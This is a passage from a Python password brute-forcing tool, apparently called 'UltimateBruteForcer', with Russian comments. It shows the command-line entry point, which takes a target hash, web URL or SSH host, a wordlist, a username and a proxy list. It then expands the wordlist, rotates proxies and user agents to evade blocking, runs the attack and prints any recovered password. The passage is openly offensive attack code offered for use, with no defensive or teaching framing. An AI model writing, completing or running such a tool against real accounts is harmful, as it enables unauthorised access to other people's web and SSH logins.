                strategy_used=self.current_strategy.get('name', 'adaptive')
            )
            
        except Exception as e:
            logger.error(f"Attack failed: {e}")
            return AttackResult(success=False, attempts=self.stats['attempts'])
        finally:
            self.save_progress("final_progress.pkl")

# Пример использования
async def main():
    print("=== INTELLIGENT BRUTEFORCER WITH TIME ESTIMATION ===")
    
    # Парсинг аргументов командной строки
    import argparse
    parser = argparse.ArgumentParser(description='Ultimate BruteForcer with AI Analysis')
    parser.add_argument('--target', required=True, help='Target hash or URL')
    parser.add_argument('--type', required=True, choices=['hash', 'web', 'ssh'], help='Attack type')
    parser.add_argument('--wordlist', required=True, help='Path to wordlist file')
    parser.add_argument('--username', help='Username for web/ssh attacks')
    parser.add_argument('--proxies', help='Path to proxies file')
    
    args = parser.parse_args()
    
    # Загрузка словаря из файла
    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            wordlist = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded wordlist with {len(wordlist)} passwords")
    except FileNotFoundError:
        logger.error(f"Wordlist file {args.wordlist} not found!")
        return
    except Exception as e:
        logger.error(f"Error loading wordlist: {e}")
        return
    
    # Определение типа атаки
    attack_type_map = {
        'hash': AttackType.HASH,
        'web': AttackType.WEB,
        'ssh': AttackType.SSH
    }
    
    # Инициализация брутфорсера
    bruteforcer = UltimateBruteForcer(
        target=args.target,
        wordlist=wordlist,
        attack_type=attack_type_map[args.type]
    )
    
    # Улучшаем словарь
    bruteforcer.enhance_wordlist()
    
    # Настраиваем прокси
    if args.proxies:
        try:
            await bruteforcer.setup_proxies(proxy_file=args.proxies)
        except Exception as e:
            logger.warning(f"Proxy setup failed: {e}, using direct connection")
    else:
        logger.info("No proxies specified, using direct connection")
    
    # Запускаем атаку с анализом
    result = await bruteforcer.run_attack()
    
    # Вывод результатов
    print(f"\n{'='*50}")
    print(f"🎯 РЕЗУЛЬТАТЫ АТАКИ")
    print(f"{'='*50}")
    print(f"Успех: {result.success}")
    if result.success:
        print(f"Найден пароль: {result.password}")
    print(f"Попыток: {result.attempts:,}")
    print(f"Время: {result.time_taken:.2f} сек")
    if result.time_taken > 0:
        print(f"Скорость: {result.attempts/result.time_taken:.0f} попыток/сек")
    print(f"Стратегия: {result.strategy_used}")
    print(f"{'='*50}")

if __name__ == "__main__":
    # Установите зависимости: 
    # pip install aiohttp aiohttp-socks fake-useragent uvloop numpy
    
    asyncio.run(main())